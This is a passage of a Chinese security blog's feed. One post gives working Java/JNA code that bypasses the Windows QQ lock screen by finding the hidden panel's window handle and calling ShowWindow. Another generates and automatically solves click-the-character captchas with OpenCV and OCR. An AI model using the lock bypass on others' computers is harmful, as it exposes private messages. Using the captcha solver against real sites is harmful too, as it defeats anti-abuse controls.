    <title>Windows版本QQ锁定可被绕过</title>
    <link href="https://fuping.site/2018/11/19/QQ-Lock-bypass/"/>
    <id>https://fuping.site/2018/11/19/QQ-Lock-bypass/</id>
    <published>2018-11-19T14:11:33.000Z</published>
    <updated>2018-11-22T01:00:02.885Z</updated>
    
    <content type="html"><![CDATA[<p>在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。</p><a id="more"></a><p><img src="640.png" alt="虚线阴影分割线"></p><h1 id="情景还原"><a href="#情景还原" class="headerlink" title="情景还原"></a>情景还原</h1><hr><p>首先演示一下如何使用抢票软件进行QQ锁定的绕过。这里以最新版本<a href="https://dldir1.qq.com/qqfile/qq/QQ9.0.7/24121/QQ9.0.7.24121.exe" target="_blank" rel="noopener">9.0.7（24121）</a>为例。下载后正常安装。</p><p><img src="01.png" alt="1542639823372"></p><p>安装后查看版本。</p><p><img src="02.png" alt="1542640660482"></p><p>将QQ锁定，然后打开软件，选择QQ通知，点击“获取聊天窗口”，此时会进行QQ窗体的加载，然后在“要发送的窗口”下拉框会显示一个随机字符串，点击“测试发送”按钮，会发现QQ控制面板弹出。</p><p><img src="03.png" alt="1542641095561"></p><p>而且是可以进行未锁定前的所有功能。如发送和接收消息，如图所示。</p><p><img src="04.png" alt="1542720813184"></p><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>刚开始的想法是首先获取QQ窗口的句柄，然后再利用句柄进行显示与隐藏。</p><h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一"></a>尝试一</h2><p>这里采用的是精易编程助手来获取句柄，当qq处于非锁定状态，获取QQ窗体句柄后，可以利用句柄对QQ进行隐藏或显示，即使把QQ锁定，也可以进行隐藏或者显示。</p><p><img src="05.gif" alt="1542722213724"></p><p>但是当QQ隐藏后，此时再获取句柄后，无法绕过QQ的锁定。这时候获取的句柄为QQ锁定状态的句柄。</p><p><img src="06.gif" alt="1542722213724"></p><blockquote><p>该方法只能对未锁定的QQ进行操作，锁定后就无法获取控制面板句柄了，因此该方法行不通。</p></blockquote><h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二"></a>尝试二</h2><p>放弃了精易编程助手，采用更专业的工具spy++。找到句柄后发现标题为一串随机的字符串，与抢票工具获取聊天窗口中标题一样。</p><p><img src="07.png" alt="1542724530787"></p><p>猜测需要最终需要获取的句柄就是这个，句柄对应的十六进制为504BE，然后调用windows api进行窗口的显示和隐藏。</p><p>显示窗口<code>ShowWindow (句柄, 1)</code>，隐藏窗口<code>ShowWindow (句柄, 0)。</code></p><p>效果如图所示。</p><p><img src="08.gif" alt="1542724530787"></p><blockquote><p>这样虽然能够满足，但是却不够智能，无法自动获取句柄，需要借助其他工具去寻找句柄，因此放弃。</p></blockquote><h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三"></a>尝试三</h2><p>本次测试中走了两条“弯路”，在这里简要说明一下，就不再附详细的过程了。某次发现使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “TXMenuWindow”)</span><br><span class="line">句柄&#x3D;窗口_取父句柄 (窗口_取父句柄 (临时_句柄))</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">临时_句柄&#x3D;FindWindowA (“TXGuiFoundation”, “”)</span><br><span class="line">句柄&#x3D;窗口_取父句柄 (临时_句柄)</span><br></pre></td></tr></table></figure><p>可以获取到QQ锁定时控制面板的句柄。如图所示</p><p><img src="09.gif" alt="1542724530787"></p><blockquote><p>但这些只是概率事件，多数情况下还是不行的。即使可以使用这两种方法，但是这两种方法获取的都是一个句柄，当有两个QQ时，就无法同时获取两个句柄了，所以该方法不可取。</p></blockquote><p>由于QQ处于锁定时，窗口标题为随机的字符串，所以无法使用FindWindowA这种方法了。</p><h2 id="尝试四之最终实现"><a href="#尝试四之最终实现" class="headerlink" title="尝试四之最终实现"></a>尝试四之最终实现</h2><p>此时想到另外一个思路，遍历屏幕上所有的顶层窗口，然后根据条件进行筛选。</p><p>这里用的Java来实现，操作Windows API采用了<a href="https://github.com/java-native-access/jna" target="_blank" rel="noopener">JNA</a>。</p><blockquote><p>JNA的全称是Java Native Access，你只要在一个java接口中描述本地库中的函数与结构， JNA将在运行期动态访问本地库，自动实现Java接口到本地库函数的映射。</p></blockquote><p>使用maven加入所需的依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.java.dev.jna<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jna-platform<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>枚举屏幕上所有的顶层窗口采用的是<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">EnumWindows</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">EnumWindows</span><span class="params">(WinUser.WNDENUMPROC lpEnumFunc,</span></span></span><br><span class="line"><span class="function"><span class="params">                    Pointer data)</span></span></span><br></pre></td></tr></table></figure><p>该函数枚举屏幕上所有的顶层窗口，并将窗口句柄传送给应用程序定义的回调函数。回调函数返回FALSE将停止枚举，否则EnumWindows函数继续到所有顶层窗口枚举完为止。</p><p>参数：lpEnumFunc - 指向应用程序定义的回调函数的长指针。</p><p>参数：data - 指定要传递给回调函数的应用程序定义的值。</p><p>代码实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(new WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">    public boolean callback(WinDef.HWND hwnd, Pointer pointer) &#123;</span><br><span class="line">        System.out.println(hwnd);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,null);</span><br></pre></td></tr></table></figure><p><img src="10.png" alt="1542765670181"></p><p>此时获取的时所有顶层窗口的句柄，剩下的就是去如何进行过滤，留下所需的句柄。</p><p><img src="11.png" alt="1542766813276"></p><p>通过对比发现，可以用窗口样式进行区分。当QQ锁定时（或QQ未锁定且最小化时），对应的窗口样式为860C0000（十进制为2248933376）。</p><p>下面为QQ锁定时的样式。</p><p><img src="12.png" alt="1542766908014"></p><p>通过查询API，可以用<code>User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>来获取窗口样式。然后通过这种方法进行过滤，当该值为2248933376，则认为对应的hwnd为QQ控制面板的句柄。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    System.out.println(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p><img src="13.png" alt="1542767244090"></p><p>可以看到成功获取了QQ锁定时控制面板的句柄。有了句柄，就可以进行之前的操作了，如显示与隐藏。</p><blockquote><p>当QQ未锁定时，QQ弹出时对应的窗口样式为960c0000（十进制为2517368832）。</p></blockquote><p><img src="14.png" alt="1542768137649"></p><p>此时就可以先通过<code>EnumWindows</code>枚举所有的窗口，然后再使用<code>GetWindowLongPtr(hwnd,User32.GWL_STYLE)</code>获取窗口样式进行匹配，匹配到所需的窗口。</p><p>这里将QQ锁定和未锁定的情况都考虑进去，然后获取QQ控制面板的句柄。之后通过<code>GetWindowText</code>获取窗口的标题，再使用<code>ShowWindow</code>进行隐藏与显示操作。主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;WinDef.HWND&gt; lt = getQQHwnds();</span><br><span class="line">        <span class="keyword">for</span> (WinDef.HWND hwnd:lt) &#123;</span><br><span class="line">            <span class="keyword">char</span>[] titleBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">512</span>];</span><br><span class="line">            User32.INSTANCE.GetWindowText(hwnd,titleBuffer,<span class="number">512</span>);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> String(titleBuffer));</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">0</span>);<span class="comment">//隐藏</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;WinDef.HWND&gt; getQQHwnds()&#123;</span><br><span class="line">        <span class="keyword">final</span> List&lt;WinDef.HWND&gt; lt = <span class="keyword">new</span> ArrayList&lt;WinDef.HWND&gt;();</span><br><span class="line"></span><br><span class="line">        User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2517368832L</span>||User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    lt.add(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> lt;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先获取到QQ控制面板的句柄，然后依次获取其标题，并进行<code>显示-隐藏-显示</code>等过程。效果如图所示。</p><p><img src="15.gif" alt="1542768137649"></p><blockquote><p>这种成功实现了QQ锁定时自动获取控制面板句柄，实现了QQ锁定的绕过。而且有多个QQ时，都可以获取其句柄。</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在一次偶然的情况下可以绕过QQ锁定，于是就进行了尝试，走了一些弯路，最终实现了这种效果。主要过程就是<code>获取所有顶层窗口句柄-根据窗口样式匹配到QQ控制面板的句柄-使用ShowWindow进行显示</code>。也许这不是最佳的解决方法。如果大家有更好的方法或者建议，欢迎分享。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga</a></p><p>[2]<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程之美" scheme="https://fuping.site/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
    
    
      <category term="锁定绕过" scheme="https://fuping.site/tags/%E9%94%81%E5%AE%9A%E7%BB%95%E8%BF%87/"/>
    
      <category term="Windows API" scheme="https://fuping.site/tags/Windows-API/"/>
    
  </entry>
  
  <entry>
    <title>中文点选验证码自动识别</title>
    <link href="https://fuping.site/2018/08/16/Automatically-Identify-Chinese-Point-Selection/"/>
    <id>https://fuping.site/2018/08/16/Automatically-Identify-Chinese-Point-Selection/</id>
    <published>2018-08-16T13:27:36.000Z</published>
    <updated>2020-07-14T07:21:29.056Z</updated>
    
    <content type="html"><![CDATA[<p>某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。</p><a id="more"></a><h2 id="0x01-验证码的获取"><a href="#0x01-验证码的获取" class="headerlink" title="0x01  验证码的获取"></a>0x01  验证码的获取</h2><p>首先获取验证码。由于网站比较特殊，就不以他们的为例，自己生成验证码吧。这个不是重点，这里直接贴代码了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createImage</span><span class="params">($word,$imagePath,$type,$imageName)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $fontPath = <span class="string">'msyh.ttc'</span>;<span class="comment">//字体</span></span><br><span class="line">    $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($word <span class="keyword">as</span> $v ) &#123;</span><br><span class="line">        $fontarea  = imagettfbbox($fontSize, <span class="number">0</span>, $fontPath, $v);</span><br><span class="line">        $textWidth = $fontarea[<span class="number">2</span>] - $fontarea[<span class="number">0</span>];</span><br><span class="line">        $textHeight = $fontarea[<span class="number">1</span>] - $fontarea[<span class="number">7</span>];</span><br><span class="line">        $tmp[<span class="string">'text'</span>] = $v;</span><br><span class="line">        $tmp[<span class="string">'size'</span>] = $fontSize;</span><br><span class="line">        $tmp[<span class="string">'width'</span>] = $textWidth;</span><br><span class="line">        $tmp[<span class="string">'height'</span>] = $textHeight;</span><br><span class="line">        $textArr[] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($imageWidth, $imageHeight, $imageType) = getimagesize($imagePath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($textArr);$i++)&#123;</span><br><span class="line">        <span class="keyword">list</span>($x, $y) = randPosition($textArr, $imageWidth, $imageHeight, $textArr[$i][<span class="string">'width'</span>], $textArr[$i][<span class="string">'height'</span>],$i,$type);</span><br><span class="line">        $textArr[$i][<span class="string">'x'</span>] = $x;</span><br><span class="line">        $textArr[$i][<span class="string">'y'</span>] = $y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建图片的实例</span></span><br><span class="line">    $image = imagecreatefromstring(file_get_contents($imagePath));</span><br><span class="line">    <span class="comment">//字体颜色</span></span><br><span class="line">    $color = imagecolorallocate($image, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//绘画文字</span></span><br><span class="line">    <span class="keyword">foreach</span>($textArr <span class="keyword">as</span> $v)&#123;</span><br><span class="line">        imagefttext($image, $v[<span class="string">'size'</span>], <span class="number">0</span>, $v[<span class="string">'x'</span>], $v[<span class="string">'y'</span>], $color, $fontPath, $v[<span class="string">'text'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(imagepng($image,$imageName))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $imageName.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randPosition</span><span class="params">($textArr, $imgW, $imgH, $fontW, $fontH,$i,$type)</span></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> ($type) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//生成mp</span></span><br><span class="line">$x = rand($i*<span class="number">60</span>, ($i+<span class="number">1</span>)*<span class="number">60</span>-$fontW<span class="number">-3</span>);</span><br><span class="line">$y = rand(<span class="number">40</span>,<span class="number">80</span>); </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//生成ap</span></span><br><span class="line">$x = ($i)*<span class="number">25</span>+<span class="number">5</span>;</span><br><span class="line">$y = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $return = <span class="keyword">array</span>($x, $y);</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ap_imagePath = <span class="string">'ap_bg.png'</span>;</span><br><span class="line">$mp_imagePath = <span class="string">'mp_bg.png'</span>;</span><br><span class="line">$ap_imageName = <span class="string">"ap_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$mp_imageName = <span class="string">"mp_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$ap_word = <span class="keyword">array</span>(<span class="string">'请'</span>,<span class="string">'依'</span>,<span class="string">'次'</span>,<span class="string">'点'</span>,<span class="string">'击'</span>,<span class="string">'图'</span>,<span class="string">'中'</span>,<span class="string">'的'</span>,<span class="string">'猎'</span>, <span class="string">'户'</span>,<span class="string">'室'</span>) ;</span><br><span class="line">$mp_word = <span class="keyword">array</span>(<span class="string">'猎'</span>, <span class="string">'户'</span>, <span class="string">'实'</span>,<span class="string">'验'</span>,<span class="string">'室'</span>);</span><br><span class="line">createImage($ap_word,$ap_imagePath,<span class="number">1</span>,$ap_imageName);</span><br><span class="line">createImage($mp_word,$mp_imagePath,<span class="number">0</span>,$mp_imageName);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后生成这样两张图片。</p><p>ap_XXXXX.png</p><p><img src="ap-01.png" alt="1534127745391"></p><p>mp_XXXXX.png</p><p><img src="mp-01.png" alt="1534127785857"></p><p>ap_XXXXX.png是说明需要点击的文字，mp_XXXXX.png是需要点击的图片。</p><h2 id="0x02-验证码识别"><a href="#0x02-验证码识别" class="headerlink" title="0x02  验证码识别"></a>0x02  验证码识别</h2><p>对于这种简单的点选验证码，可以有两种很容易的识别方式（机器学习算麻烦的，这里就不列出了。嗯，对，我也不会）。一种是opencv的图像模板匹配，另外一种是OCR识别。</p><h3 id="1-opencv的图像模板匹配"><a href="#1-opencv的图像模板匹配" class="headerlink" title="1. opencv的图像模板匹配"></a>1. opencv的图像模板匹配</h3><p>第一种方式，使用opencv的图像模板匹配。模板匹配是一种在较大图像中搜索和查找模板图像位置的方法，opencv2和opencv3中提供了一个专门用于模板匹配的函数matchTemplate()。它是在输入图像上滑动模板图像（如在2D卷积中），并比较模板图像下的输入图像的模板和补丁。在OpenCV中实现了六种比较方法（这里用到的是<code>cv2.TM_CCOEFF_NORMED</code>），它返回一个灰度图像，其中每个像素表示该像素的邻域与模板匹配的程度。</p><p>获得结果后，可以使用cv.minMaxLoc（）函数查找最大/最小值的位置。将其作为矩形的左上角，并将（w，h）作为矩形的宽度和高度，那个矩形就是模板区域。 。</p><p>我们进行使用模板匹配来识别这种验证码时，首先先将“模板”找出来，这里我们需要匹配的是“猎”、“户”、“室”这三个字。将这三个字所在的图片进行截取，然后使用matchTemplate()函数在mp中进行匹配。</p><p>首先截取第一个字“猎”。</p><p><img src="1534141199627.png" alt="1534141199627"></p><p>截取之后，就可以在mp中进行匹配。</p><p><img src="1534319979597.png" alt="1534319979597"></p><p>这里得到了最大和最小位置。我们使用最大位置，然后将最大值作为阈值。获取模板的尺寸，然后在mp中用矩形（红色区域）画出匹配的区域。如下所示。</p><p><img src="1534142377712.png" alt="1534142377712"></p><p>同理，用黄色和蓝色矩形将“户”、“室”所在的区域画出来。</p><p><img src="1534142664129.png" alt="1534142664129"></p><p>点选时发送所选区域中间的坐标即可，这里就不再给出实例了。</p><p>这种方法虽然简单，但是对于字体不一的就不能很正确的标记出来。</p><p>修改生成图片的代码，将mp中的文字的字体设置为随机。</p><p>修改的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//mp 文字随机大小</span></span><br><span class="line">        $fontSize = rand(<span class="number">20</span>,<span class="number">30</span>) * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//ap 文字固定</span></span><br><span class="line">        $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ap生成的结果还是和之前一样，mp的图片如下：</p><p><img src="1534406354140.png" alt="1534406354140"></p><p>使用同样的代码来匹配。</p><p><img src="1534406412351.png" alt="1534406412351"></p><p>此时匹配的结果就有些惨不忍睹了。所以就换另外一种识别方式-ocr识别。</p><h3 id="2-OCR识别"><a href="#2-OCR识别" class="headerlink" title="2. OCR识别"></a>2. OCR识别</h3><p>这里采用的是腾讯云的<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">OCR-通用印刷体识别</a>。</p><p>参考文档。输入mp图片，返回的是json。</p><p><img src="1534407226287.png" alt="1534407226287"></p><p>查看json内容，发现包含了图片中的文字、位置和大小等。</p><p><img src="1534407260832.png" alt="1534407260832"></p><p>同理ap中内容也可以获取。</p><p><img src="1534407371139.png" alt="1534407371139"></p><p>此时匹配的时候直接就是匹配文字了。首先获取ap中后三个文字，然后与mp中返回的内容匹配，获取其位置和大小，然后再画矩形即可。</p><p>由于比较简单，这里直接贴结果。</p><p><img src="1534408948730.png" alt="1534408948730"></p><p>匹配相当完美。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h2><p>本文用了两种方法来自动识别汉字点选验证码，第一种采用的是opencv的模板匹配，这种方法虽然也可以匹配到，但这种方法缺点就是对于字体形状差异较大的验证码识别率较低。而第二种方法就比较快捷方便了，而且识别度高，比较推荐第二种方法。</p><p>当然这两种方法对于简单、“正规”的验证码可以，遇到复杂的、“扭曲的”验证码就不行了。这时候就要用到机器学习了，而本文只是简单的“识别”，将机器学习用到这里，就有些大材小用了。</p><p>相关代码：<a href="https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection</a></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p>[1] <a href="http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html" target="_blank" rel="noopener">http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html</a></p><p>[2]<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/866/17600</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。&lt;/p&gt;
    
    </summary>
    
    
      <category term="验证码识别" scheme="https://fuping.site/categories/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
    
      <category term="点选验证码" scheme="https://fuping.site/tags/%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
      <category term="验证码识别" scheme="https://fuping.site/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs writeup</title>
    <link href="https://fuping.site/2018/06/04/upload-labs-writeup/"/>
    <id>https://fuping.site/2018/06/04/upload-labs-writeup/</id>
    <published>2018-06-04T02:25:58.000Z</published>
    <updated>2020-07-14T07:18:08.044Z</updated>
    
